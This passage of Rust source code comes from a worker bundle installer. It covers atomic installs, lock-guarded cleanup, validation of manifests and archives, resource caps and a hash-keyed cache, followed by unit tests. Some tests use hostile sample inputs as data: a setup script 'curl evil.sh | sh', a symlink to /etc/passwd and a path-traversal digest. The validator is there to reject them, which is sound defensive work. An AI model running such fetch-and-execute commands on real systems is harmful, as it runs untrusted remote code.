    use std::sync::atomic::{AtomicU64, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let file_name = final_dir
        .file_name()
        .and_then(|os| os.to_str())
        .unwrap_or("bundle");
    let sibling_name = format!("{file_name}.partial.{ts}.{counter}");
    final_dir.with_file_name(sibling_name)
}

/// Builds a sibling path next to `final_dir` where a previous install
/// is parked during replacement. Lives in the same parent directory so
/// both the rename-aside and any restore are same-filesystem atomic
/// renames. Distinct `.old.` infix keeps it from ever colliding with
/// the cross-fs `.partial.` siblings.
fn sibling_old_dir(final_dir: &Path) -> PathBuf {
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let file_name = final_dir
        .file_name()
        .and_then(|os| os.to_str())
        .unwrap_or("bundle");
    let sibling_name = format!("{file_name}.old.{ts}.{counter}");
    final_dir.with_file_name(sibling_name)
}

/// Best-effort sweep of `<final_dir>.old.*` siblings left behind when a
/// previous replacement crashed between the rename-aside and its cleanup
/// (`sweep_orphans` only covers the staging root). Runs under the
/// per-worker install lock, so a parked dir belonging to a LIVE
/// replacement can never be swept.
fn sweep_stale_old_siblings(final_dir: &Path) {
    let Some(parent) = final_dir.parent() else {
        return;
    };
    let Some(file_name) = final_dir.file_name().and_then(|os| os.to_str()) else {
        return;
    };
    let prefix = format!("{file_name}.old.");
    let Ok(entries) = std::fs::read_dir(parent) else {
        return;
    };
    for entry in entries.filter_map(|e| e.ok()) {
        let name = entry.file_name();
        let Some(name) = name.to_str() else { continue };
        if name.starts_with(&prefix) {
            let _ = std::fs::remove_dir_all(entry.path());
        }
    }
}

fn cross_device_or_busy(e: &std::io::Error) -> bool {
    // EXDEV = 18 on Linux; on macOS as well.
    matches!(e.raw_os_error(), Some(18) | Some(16))
}

/// Recursively copies `src` into `dst`, creating `dst` if needed.
///
/// Does NOT delete `src`. The cross-fs install pipeline relies on the
/// caller to remove `src` (the staging dir) only after the partial
/// sibling has been atomically renamed into `final_dir`. Keeping the
/// delete separate lets us roll the partial sibling back on copy
/// failure without losing the staging contents.
fn copy_dir_tree(src: &Path, dst: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dst)?;
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let ft = entry.file_type()?;
        let s = entry.path();
        let d = dst.join(entry.file_name());
        if ft.is_dir() {
            copy_dir_tree(&s, &d)?;
        } else if ft.is_file() {
            std::fs::copy(&s, &d)?;
        } else {
            // We pre-validated entries in extract; nothing else should
            // ever appear here. If it does, refuse — better to fail the
            // install than carry a surprise into the bundle root.
            return Err(std::io::Error::other(format!(
                "unsupported file type during cross-device install: {}",
                s.display()
            )));
        }
    }
    Ok(())
}

/// Startup-time orphan sweep.
///
/// The RAII `StagingGuard` cleans up staging directories on graceful
/// drop. It cannot run if the process was killed (SIGKILL, OOM, host
/// power cut). On engine/CLI startup we walk the staging root and
/// remove anything that satisfies BOTH of the following:
///
///   * The directory is older than `MIN_STAGING_AGE_SECS` (defensive
///     against a fresh install whose mtime is updated less often than
///     bytes are written).
///   * The corresponding per-worker fslock is acquirable as a
///     non-blocking try-lock. A live holder ALWAYS has the lock held,
///     so a successful try-lock proves no install is in flight.
///
/// The lock check closes the bug where a slow 64 MiB download on a
/// 1 Mbps link took ~9 minutes and a sibling `iii worker list`
/// invocation's `sweep_orphans` deleted the in-flight staging dir.
///
/// Best-effort: returns the number of directories removed; logs but
/// does not propagate per-directory errors.
pub fn sweep_orphans() -> usize {
    const MIN_STAGING_AGE_SECS: u64 = 60;
    let root = bundle_staging_root();
    let entries = match std::fs::read_dir(&root) {
        Ok(e) => e,
        Err(_) => return 0,
    };
    let mut removed = 0;
    for entry in entries.flatten() {
        let path = entry.path();
        let metadata = match entry.metadata() {
            Ok(m) => m,
            Err(_) => continue,
        };
        if !metadata.is_dir() {
            continue;
        }
        let age = metadata
            .modified()
            .ok()
            .and_then(|m| m.elapsed().ok())
            .map(|d| d.as_secs())
            .unwrap_or(u64::MAX);
        if age < MIN_STAGING_AGE_SECS {
            continue;
        }

        // Recover the worker name from the staging dir basename.
        // `unique_staging_dir_name` formats `{name}-{ts}-{counter}` —
        // the name MAY itself contain dashes (validate_worker_name
        // permits `-` `_` `.` and alnum), so the safe split is on
        // the LAST two `-` segments.
        let basename = match path.file_name().and_then(|s| s.to_str()) {
            Some(s) => s,
            None => continue,
        };
        let worker_name = match strip_unique_suffix(basename) {
            Some(n) => n,
            None => continue,
        };

        // Acquire the per-worker lock non-blocking. If it's held, a
        // live install owns the staging dir — leave it alone.
        let lock_path = lock_path_for(worker_name);
        let mut lock = match fslock::LockFile::open(&lock_path) {
            Ok(l) => l,
            Err(_) => continue,
        };
        let acquired = match lock.try_lock_with_pid() {
            Ok(true) => true,
            Ok(false) => false,
            Err(_) => false,
        };
        if !acquired {
            tracing::debug!(
                staging = %path.display(),
                worker = %worker_name,
                "skipping sweep: lock held by live install"
            );
            continue;
        }
        // Release the lock immediately so the legitimate install path
        // can acquire it. `LockFile::unlock` returns Result; on error
        // the lock will release when the LockFile drops anyway.
        let _ = lock.unlock();

        match std::fs::remove_dir_all(&path) {
            Ok(()) => {
                tracing::info!(staging = %path.display(), "swept orphan bundle staging dir");
                removed += 1;
            }
            Err(e) => {
                tracing::warn!(
                    staging = %path.display(),
                    error = %e,
                    "failed to sweep orphan bundle staging dir"
                );
            }
        }
    }
    removed
}

/// Strip the `-{ts}-{counter}` suffix from a unique staging dir name to
/// recover the worker name. Returns `None` if the format doesn't match.
fn strip_unique_suffix(basename: &str) -> Option<&str> {
    let last_dash = basename.rfind('-')?;
    let prefix = &basename[..last_dash];
    let penultimate_dash = prefix.rfind('-')?;
    Some(&basename[..penultimate_dash])
}

pub fn validate_bundle_manifest(
    manifest_dir: &std::path::Path,
    expected_name: &str,
) -> Result<String, WorkerOpError> {
    let manifest_path = manifest_dir.join("iii.worker.yaml");
    // Cap manifest size BEFORE the read so a publisher-controlled
    // billion-laughs YAML (chained `&anchor` / `*alias` expansion) can
    // never reach serde_yaml::from_str. serde_yaml 0.9.x is libyaml-
    // based and does not gate exponential alias expansion in-tree.
    // 64 KiB is plenty for a real manifest and bounds worst-case
    // expansion to a few MiB.
    match std::fs::metadata(&manifest_path) {
        Ok(meta) if meta.len() > MAX_BUNDLE_MANIFEST_BYTES => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "iii.worker.yaml".into(),
                reason: format!(
                    "manifest is {} bytes; bundle manifests are capped at {} bytes \
                     (billion-laughs YAML defense)",
                    meta.len(),
                    MAX_BUNDLE_MANIFEST_BYTES,
                ),
            });
        }
        Ok(_) => {}
        Err(source) if source.kind() == std::io::ErrorKind::NotFound => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "iii.worker.yaml".into(),
                reason: "manifest must exist at archive root".into(),
            });
        }
        Err(source) => {
            return Err(WorkerOpError::ConfigIo {
                path: manifest_path,
                source,
            });
        }
    }

    let content = match std::fs::read_to_string(&manifest_path) {
        Ok(c) => c,
        Err(source) if source.kind() == std::io::ErrorKind::NotFound => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "iii.worker.yaml".into(),
                reason: "manifest must exist at archive root".into(),
            });
        }
        Err(source) => {
            return Err(WorkerOpError::ConfigIo {
                path: manifest_path,
                source,
            });
        }
    };

    let doc: serde_yaml::Value =
        serde_yaml::from_str(&content).map_err(|e| WorkerOpError::ConfigParse {
            path: manifest_path.clone(),
            message: format!("invalid YAML: {e}"),
        })?;

    // name must equal the install target.
    let manifest_name = doc
        .get("name")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty());
    match manifest_name {
        Some(n) if n == expected_name => {}
        Some(other) => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "name".into(),
                reason: format!(
                    "manifest declares name {other:?} but installing as {expected_name:?}"
                ),
            });
        }
        None => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "name".into(),
                reason: "manifest must declare `name` matching the install target".into(),
            });
        }
    }

    // Reject runtime.base_image. Bundles use the engine-allowlisted
    // base image, not whatever the publisher picks.
    if doc
        .get("runtime")
        .and_then(|r| r.get("base_image"))
        .is_some()
    {
        return Err(WorkerOpError::BundleManifestRejected {
            field: "runtime.base_image".into(),
            reason: "bundle workers cannot override the base image; \
                     use a binary or OCI worker if you need a custom rootfs"
                .into(),
        });
    }

    // Reject scripts.setup and scripts.install — they would execute
    // publisher-supplied shell during install.
    if let Some(scripts) = doc.get("scripts") {
        if scripts
            .get("setup")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .is_some_and(|s| !s.is_empty())
        {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "scripts.setup".into(),
                reason: "bundle manifests must not declare scripts.setup; \
                         pre-build the bundle and ship it ready-to-run"
                    .into(),
            });
        }
        if scripts
            .get("install")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .is_some_and(|s| !s.is_empty())
        {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "scripts.install".into(),
                reason: "bundle manifests must not declare scripts.install; \
                         vendor dependencies into the bundle"
                    .into(),
            });
        }
    }

    // scripts.start is the only command we will execute. Must be a
    // non-empty shell string (matches existing local-worker rails —
    // see project.rs::load_project_info around scripts.start).
    let start = doc
        .get("scripts")
        .and_then(|s| s.get("start"))
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty());
    match start {
        Some(cmd) => Ok(cmd.to_string()),
        None => Err(WorkerOpError::BundleManifestRejected {
            field: "scripts.start".into(),
            reason: "bundle manifest must declare scripts.start as a non-empty \
                     shell string (e.g. \"node bundle.js\")"
                .into(),
        }),
    }
}

/// Default resource ceilings applied to bundle workers when the engine
/// does not provide an explicit cap. Tuned to fit on a developer laptop
/// without letting a single bundle starve the host.
///
/// These mirror the `PerImageCap` semantics in `sandbox_daemon::config`
/// but live here because bundle workers don't (yet) carry an explicit
/// base-image declaration the engine can key on. A future engine-level
/// cap can shadow this default if operators want something tighter or
/// looser.
pub const DEFAULT_BUNDLE_MAX_CPUS: u32 = 4;
pub const DEFAULT_BUNDLE_MAX_MEMORY_MB: u32 = 4096;

/// Default resources requested when a bundle manifest is silent on
/// `resources.cpus` or `resources.memory`. Matches the local-path
/// defaults so existing publishers don't have to think about it.
const DEFAULT_BUNDLE_CPUS: u32 = 2;
const DEFAULT_BUNDLE_MEMORY_MB: u32 = 2048;

/// Caps that bundle workers are clamped against. T10 will let the
/// engine override these via config; for now they're the defaults.
#[derive(Debug, Clone, Copy)]
pub struct ResourceCaps {
    pub max_cpus: u32,
    pub max_memory_mb: u32,
}

impl Default for ResourceCaps {
    fn default() -> Self {
        Self {
            max_cpus: DEFAULT_BUNDLE_MAX_CPUS,
            max_memory_mb: DEFAULT_BUNDLE_MAX_MEMORY_MB,
        }
    }
}

/// Outcome of bundle resource parsing. The `clamped_*` fields are
/// non-empty when the publisher requested more than the engine allows;
/// callers should emit a WARN event so the operator sees what happened
/// rather than silently shrinking the worker (Prime Directive: zero
/// silent failures).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResolvedBundleResources {
    pub cpus: u32,
    pub memory_mb: u32,
    /// Non-`None` when `resources.cpus` exceeded `caps.max_cpus`. Carries
    /// the original request so the WARN message can name it.
    pub clamped_cpus: Option<u32>,
    /// Non-`None` when `resources.memory` exceeded `caps.max_memory_mb`.
    pub clamped_memory_mb: Option<u32>,
}

pub fn parse_bundle_resources(
    manifest_dir: &std::path::Path,
    caps: ResourceCaps,
) -> Result<ResolvedBundleResources, WorkerOpError> {
    let manifest_path = manifest_dir.join("iii.worker.yaml");
    // Same billion-laughs defense as validate_bundle_manifest: refuse
    // to even read a manifest larger than MAX_BUNDLE_MANIFEST_BYTES.
    if let Ok(meta) = std::fs::metadata(&manifest_path)
        && meta.len() > MAX_BUNDLE_MANIFEST_BYTES
    {
        return Err(WorkerOpError::BundleManifestRejected {
            field: "iii.worker.yaml".into(),
            reason: format!(
                "manifest is {} bytes; bundle manifests are capped at {} bytes \
                 (billion-laughs YAML defense)",
                meta.len(),
                MAX_BUNDLE_MANIFEST_BYTES,
            ),
        });
    }
    let content =
        std::fs::read_to_string(&manifest_path).map_err(|source| WorkerOpError::ConfigIo {
            path: manifest_path.clone(),
            source,
        })?;
    let doc: serde_yaml::Value =
        serde_yaml::from_str(&content).map_err(|e| WorkerOpError::ConfigParse {
            path: manifest_path,
            message: format!("invalid YAML in resources block: {e}"),
        })?;

    fn read_u32(doc: &serde_yaml::Value, key: &str, default: u32) -> u32 {
        match doc
            .get("resources")
            .and_then(|r| r.get(key))
            .and_then(|v| v.as_u64())
        {
            Some(n) if n <= u32::MAX as u64 => n as u32,
            Some(_overflow) => u32::MAX,
            None => default,
        }
    }

    let requested_cpus = read_u32(&doc, "cpus", DEFAULT_BUNDLE_CPUS);
    let requested_memory = read_u32(&doc, "memory", DEFAULT_BUNDLE_MEMORY_MB);

    let (cpus, clamped_cpus) = if requested_cpus > caps.max_cpus {
        (caps.max_cpus, Some(requested_cpus))
    } else {
        (requested_cpus, None)
    };
    let (memory_mb, clamped_memory_mb) = if requested_memory > caps.max_memory_mb {
        (caps.max_memory_mb, Some(requested_memory))
    } else {
        (requested_memory, None)
    };

    Ok(ResolvedBundleResources {
        cpus,
        memory_mb,
        clamped_cpus,
        clamped_memory_mb,
    })
}

/// Total disk budget for the bundle archive cache, in bytes. The
/// cache holds verified tar.gz blobs keyed by SHA-256 so re-installs
/// of the same `name@version` skip the network entirely. LRU eviction
/// drives the cache back under this limit on every successful insert.
pub const BUNDLE_CACHE_MAX_BYTES: u64 = 1024 * 1024 * 1024;

/// Returns the cache directory: `~/.iii/cache/bundles/`.
pub fn bundle_cache_dir() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_default()
        .join(".iii")
        .join("cache")
        .join("bundles")
}

/// Returns the cache filename for a given SHA-256 hex digest.
///
/// The digest is the cache key: identical bytes have identical digests
/// regardless of which `name@version` published them, so a single
/// blob serves every install that points at the same archive.
///
/// The function rejects digests that are not 64 lowercase-hex characters,
/// so a malformed registry response can never reach across the cache
/// directory via a crafted filename like `../../etc/passwd`.
pub fn cached_archive_path(sha256_hex: &str) -> Option<PathBuf> {
    let trimmed = sha256_hex.trim();
    if trimmed.len() != 64 || !trimmed.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    Some(bundle_cache_dir().join(format!("{}.tar.gz", trimmed.to_ascii_lowercase())))
}

/// Returns the cached archive path if the cache holds a blob whose
/// recomputed SHA-256 matches `expected_sha256_hex`. Hash mismatches
/// (cache corruption, e.g. partial write on power cut) cause the
/// cached blob to be removed and `None` returned so the install path
/// falls back to a fresh download.
///
/// On hit, touches the file's mtime to mark recent use (LRU input).
pub fn lookup_cached_archive(expected_sha256_hex: &str) -> Option<PathBuf> {
    let path = cached_archive_path(expected_sha256_hex)?;
    if !path.is_file() {
        return None;
    }

    use sha2::{Digest, Sha256};
    use std::io::Read as _;

    let mut file = match std::fs::File::open(&path) {
        Ok(f) => f,
        Err(_) => return None,
    };
    let mut hasher = Sha256::new();
    let mut buf = [0u8; 64 * 1024];
    loop {
        let n = match file.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => n,
            Err(_) => return None,
        };
        hasher.update(&buf[..n]);
    }
    let actual = format!("{:x}", hasher.finalize());
    if !actual.eq_ignore_ascii_case(expected_sha256_hex.trim()) {
        tracing::warn!(
            cache.path = %path.display(),
            cache.expected_sha256 = %expected_sha256_hex,
            cache.actual_sha256 = %actual,
            "bundle.cache.miss_corrupt"
        );
        let _ = std::fs::remove_file(&path);
        return None;
    }

    // Touch mtime to mark recent use. Best-effort; failure here does
    // not invalidate the hit.
    if let Ok(metadata) = file.metadata() {
        let now = std::time::SystemTime::now();
        let _ = filetime_touch(&path, now, metadata);
    }
    Some(path)
}

/// Updates `path`'s mtime to `now` so LRU eviction reflects real
/// recency-of-use rather than initial-write time. Atime is intentionally
/// touched too on hosts where the platform supports it; some mounts
/// (e.g. `noatime`) silently ignore atime updates, which is fine.
///
/// `_metadata` is accepted for API symmetry with the previous no-op
/// signature; the underlying syscall does not need it.
///
/// Best-effort: a failure here just means the LRU stays slightly stale
/// for this entry. We log and move on.
fn filetime_touch(
    path: &Path,
    now: std::time::SystemTime,
    _metadata: std::fs::Metadata,
) -> std::io::Result<()> {
    let ft = filetime::FileTime::from_system_time(now);
    filetime::set_file_times(path, ft, ft)
}

/// Inserts `archive_path`'s contents into the cache under
/// `<sha256>.tar.gz`. The caller has already verified the sha256, so
/// this function trusts the digest and copies the bytes; if the
/// destination already exists it is a no-op (cache is keyed by hash,
/// so identical bytes are already there).
///
/// After insert, drives LRU eviction back under `BUNDLE_CACHE_MAX_BYTES`.
/// Failures during evict are logged but never fail the parent install.
pub fn store_in_cache(archive_path: &Path, sha256_hex: &str) -> std::io::Result<()> {
    let Some(dst) = cached_archive_path(sha256_hex) else {
        // Don't fail the install — caching is a best-effort optimization.
        tracing::warn!(
            cache.sha256 = %sha256_hex,
            "bundle.cache.skip_invalid_digest"
        );
        return Ok(());
    };
    if dst.exists() {
        return Ok(());
    }
    std::fs::create_dir_all(bundle_cache_dir())?;
    // Use copy + rename so a partial write never leaves a hash-named
    // file with the wrong contents in place.
    let tmp = dst.with_extension("tar.gz.partial");
    std::fs::copy(archive_path, &tmp)?;
    std::fs::rename(&tmp, &dst)?;
    let _ = evict_cache_to_limit(BUNDLE_CACHE_MAX_BYTES);
    Ok(())
}

/// LRU eviction: while the total cache size exceeds `limit_bytes`,
/// removes the file with the oldest mtime. Best-effort — errors during
/// directory scan or file removal are logged but never propagated.
pub fn evict_cache_to_limit(limit_bytes: u64) -> std::io::Result<()> {
    let dir = bundle_cache_dir();
    if !dir.is_dir() {
        return Ok(());
    }
    loop {
        let mut entries: Vec<(PathBuf, u64, std::time::SystemTime)> = Vec::new();
        let mut total: u64 = 0;
        for entry in std::fs::read_dir(&dir)? {
            let entry = entry?;
            let metadata = match entry.metadata() {
                Ok(m) => m,
                Err(_) => continue,
            };
            if !metadata.is_file() {
                continue;
            }
            let size = metadata.len();
            let modified = metadata.modified().unwrap_or(std::time::UNIX_EPOCH);
            entries.push((entry.path(), size, modified));
            total = total.saturating_add(size);
        }
        if total <= limit_bytes {
            return Ok(());
        }
        // Sort oldest-first.
        entries.sort_by_key(|(_, _, m)| *m);
        let Some((victim, victim_size, _)) = entries.into_iter().next() else {
            return Ok(());
        };
        match std::fs::remove_file(&victim) {
            Ok(()) => {
                tracing::info!(
                    cache.path = %victim.display(),
                    cache.bytes_freed = victim_size,
                    "bundle.cache.evict"
                );
            }
            Err(e) => {
                tracing::warn!(
                    cache.path = %victim.display(),
                    error = %e,
                    "bundle.cache.evict_failed"
                );
                return Ok(()); // give up to avoid infinite loop on a stuck file
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write as _;

    fn make_targz_in_memory(entries: &[(&str, &[u8], tar::EntryType)]) -> Vec<u8> {
        use flate2::Compression;
        use flate2::write::GzEncoder;

        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        {
            let mut archive = tar::Builder::new(&mut encoder);
            for (path, content, kind) in entries {
                let mut header = tar::Header::new_gnu();
                header.set_path(path).unwrap();
                header.set_size(content.len() as u64);
                header.set_mode(0o644);
                header.set_entry_type(*kind);
                header.set_cksum();
                archive.append(&header, *content as &[u8]).unwrap();
            }
            archive.finish().unwrap();
        }
        encoder.finish().unwrap()
    }

    #[test]
    fn extract_accepts_regular_files_and_directories() {
        let archive = make_targz_in_memory(&[
            ("iii.worker.yaml", b"name: foo\n", tar::EntryType::Regular),
            ("bundle.js", b"console.log('hi');", tar::EntryType::Regular),
        ]);
        let tmp = tempfile::tempdir().unwrap();
        let archive_path = tmp.path().join("a.tar.gz");
        std::fs::write(&archive_path, &archive).unwrap();
        let dest = tmp.path().join("dest");
        std::fs::create_dir_all(&dest).unwrap();

        extract_bundle_safely_blocking(&archive_path, &dest).expect("happy-path extract");
        assert!(dest.join("iii.worker.yaml").is_file());
        assert!(dest.join("bundle.js").is_file());
    }

    #[test]
    fn extract_rejects_symlink_entries() {
        // Build a tar with a symlink entry directly (tar::Builder::append
        // on a symlink path on disk would also work but is OS-coupled).
        let mut raw = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut raw);
            let mut header = tar::Header::new_gnu();
            header.set_path("link").unwrap();
            header.set_entry_type(tar::EntryType::Symlink);
            header.set_size(0);
            header.set_link_name("/etc/passwd").expect("link name");
            header.set_cksum();
            builder.append(&header, &b""[..]).unwrap();
            builder.finish().unwrap();
        }
        let mut gz = Vec::new();
        {
            use flate2::Compression;
            use flate2::write::GzEncoder;
            let mut enc = GzEncoder::new(&mut gz, Compression::default());
            enc.write_all(&raw).unwrap();
            enc.finish().unwrap();
        }

        let tmp = tempfile::tempdir().unwrap();
        let archive_path = tmp.path().join("a.tar.gz");
        std::fs::write(&archive_path, &gz).unwrap();
        let dest = tmp.path().join("dest");
        std::fs::create_dir_all(&dest).unwrap();

        let err =
            extract_bundle_safely_blocking(&archive_path, &dest).expect_err("symlink rejected");
        match err {
            WorkerOpError::BundleArchiveUnsafe { reason, .. } => {
                assert!(reason.contains("Symlink") || reason.contains("entry type"));
            }
            other => panic!("expected BundleArchiveUnsafe, got {other:?}"),
        }
    }

    // Note: `..` traversal coverage requires raw-tar-bytes construction
    // (the tar crate's Builder rejects `..` paths at write time, so the
    // attack archive cannot be built through the safe API). The
    // adversarial path tests live in T12's bundle_worker_integration.rs
    // which mirrors the raw-tar helper from binary_worker_integration.rs.

    fn write_manifest(dir: &std::path::Path, body: &str) {
        std::fs::write(dir.join("iii.worker.yaml"), body).unwrap();
    }

    #[test]
    fn validate_bundle_manifest_happy_path() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nscripts:\n  start: \"node bundle.js\"\n",
        );
        let cmd = validate_bundle_manifest(tmp.path(), "foo").expect("happy");
        assert_eq!(cmd, "node bundle.js");
    }

    #[test]
    fn validate_bundle_manifest_rejects_setup() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nscripts:\n  setup: \"curl evil.sh | sh\"\n  start: \"node x.js\"\n",
        );
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "scripts.setup");
            }
            other => panic!("expected BundleManifestRejected scripts.setup, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_rejects_install() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nscripts:\n  install: npm i\n  start: node x.js\n",
        );
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "scripts.install");
            }
            other => panic!("expected BundleManifestRejected scripts.install, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_rejects_runtime_base_image() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nruntime:\n  base_image: evil/img:latest\nscripts:\n  start: node x.js\n",
        );
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "runtime.base_image");
            }
            other => panic!("expected BundleManifestRejected runtime.base_image, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_rejects_name_mismatch() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(tmp.path(), "name: bar\nscripts:\n  start: node x.js\n");
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "name");
            }
            other => panic!("expected BundleManifestRejected name, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_missing_start() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(tmp.path(), "name: foo\n");
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "scripts.start");
            }
            other => panic!("expected BundleManifestRejected scripts.start, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_missing_file() {
        let tmp = tempfile::tempdir().unwrap();
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "iii.worker.yaml");
            }
            other => panic!("expected BundleManifestRejected iii.worker.yaml, got {other:?}"),
        }
    }

    #[test]
    fn parse_bundle_resources_uses_defaults_when_absent() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(tmp.path(), "name: foo\nscripts:\n  start: node x.js\n");
        let res = parse_bundle_resources(tmp.path(), ResourceCaps::default()).unwrap();
        assert_eq!(res.cpus, DEFAULT_BUNDLE_CPUS);
        assert_eq!(res.memory_mb, DEFAULT_BUNDLE_MEMORY_MB);
        assert!(res.clamped_cpus.is_none());
        assert!(res.clamped_memory_mb.is_none());
    }

    #[test]
    fn parse_bundle_resources_clamps_excessive_cpu() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nresources:\n  cpus: 64\n  memory: 2048\nscripts:\n  start: x\n",
        );
        let caps = ResourceCaps {
            max_cpus: 4,
            max_memory_mb: 4096,
        };
        let res = parse_bundle_resources(tmp.path(), caps).unwrap();
        assert_eq!(res.cpus, 4);
        assert_eq!(res.clamped_cpus, Some(64));
        assert!(res.clamped_memory_mb.is_none());
    }

    #[test]
    fn parse_bundle_resources_clamps_excessive_memory() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nresources:\n  cpus: 2\n  memory: 262144\nscripts:\n  start: x\n",
        );
        let res = parse_bundle_resources(tmp.path(), ResourceCaps::default()).unwrap();
        assert_eq!(res.cpus, 2);
        assert_eq!(res.memory_mb, DEFAULT_BUNDLE_MAX_MEMORY_MB);
        assert!(res.clamped_cpus.is_none());
        assert_eq!(res.clamped_memory_mb, Some(262144));
    }

    #[test]
    fn parse_bundle_resources_saturates_overflow_not_truncates() {
        // `.as_u64() as u32` truncates a u64 value > u32::MAX into a
        // small u32 silently. The strict parser saturates instead so
        // the clamp step sees the over-the-limit value and surfaces
        // it as `clamped_*`.
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nresources:\n  cpus: 4294967296\n  memory: 2048\nscripts:\n  start: x\n",
        );
        let res = parse_bundle_resources(tmp.path(), ResourceCaps::default()).unwrap();
        assert_eq!(res.cpus, DEFAULT_BUNDLE_MAX_CPUS);
        // u32::MAX is what the saturating cast produces; the clamp
        // reports that value as the original request.
        assert_eq!(res.clamped_cpus, Some(u32::MAX));
    }

    #[test]
    fn cached_archive_path_rejects_short_digest() {
        assert!(cached_archive_path("deadbeef").is_none());
    }

    #[test]
    fn cached_archive_path_rejects_nonhex_digest() {
        // 64 chars but a non-hex character mid-string.
        let bad = format!("{}z{}", "a".repeat(32), "b".repeat(31));
        assert_eq!(bad.len(), 64);
        assert!(cached_archive_path(&bad).is_none());
    }

    #[test]
    fn cached_archive_path_rejects_traversal_attempt() {
        // Even with the right length, anything non-hex (like a slash)
        // must be rejected so a hostile registry can't write outside
        // the cache directory by smuggling `..` into the digest field.
        let bad = "a".repeat(62) + "/x";
        assert_eq!(bad.len(), 64);
        assert!(cached_archive_path(&bad).is_none());
    }

    #[test]
    fn cached_archive_path_accepts_valid_digest() {
        let digest = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
        let p = cached_archive_path(digest).expect("valid digest accepted");
        assert!(p.to_string_lossy().ends_with(&format!("{digest}.tar.gz")));
    }

    // Note: `lookup_cached_archive` and `store_in_cache` exercise
    // `dirs::home_dir()` for the cache root. Integration coverage of
    // the round-trip is in T12's tests/bundle_worker_integration.rs
    // (uses serial_test + HOME mutation, same as the other home-aware
    // tests in this crate).

    #[test]
    fn copy_dir_tree_recurses_and_creates_dst() {
        // Regression: the cross-device install path now copies into a
        // sibling tmp dir BEFORE renaming into `final_dir`. The copy
        // primitive must build the destination tree from scratch and
        // recurse into nested directories.
        let tmp = tempfile::tempdir().expect("tempdir");
        let src = tmp.path().join("src");
        std::fs::create_dir_all(src.join("nested/inner")).expect("mkdir");
        std::fs::write(src.join("top.txt"), b"top").expect("write");
        std::fs::write(src.join("nested/mid.txt"), b"mid").expect("write");
        std::fs::write(src.join("nested/inner/leaf.txt"), b"leaf").expect("write");

        let dst = tmp.path().join("dst");
        copy_dir_tree(&src, &dst).expect("copy ok");

        assert!(dst.join("top.txt").is_file());
        assert!(dst.join("nested/mid.txt").is_file());
        assert!(dst.join("nested/inner/leaf.txt").is_file());
        assert_eq!(
            std::fs::read(dst.join("nested/inner/leaf.txt")).unwrap(),
            b"leaf"
        );

        // Source must remain — copy_dir_tree never deletes; atomic_install
        // does that AFTER the sibling has been renamed into place.
        assert!(src.join("top.txt").is_file());
    }

    #[test]
    fn sibling_partial_dir_lives_next_to_final() {
        let final_dir = std::path::PathBuf::from("/tmp/iii-bundles/myworker");
        let sib = sibling_partial_dir(&final_dir);
        assert_eq!(sib.parent(), final_dir.parent());
        assert!(
            sib.file_name()
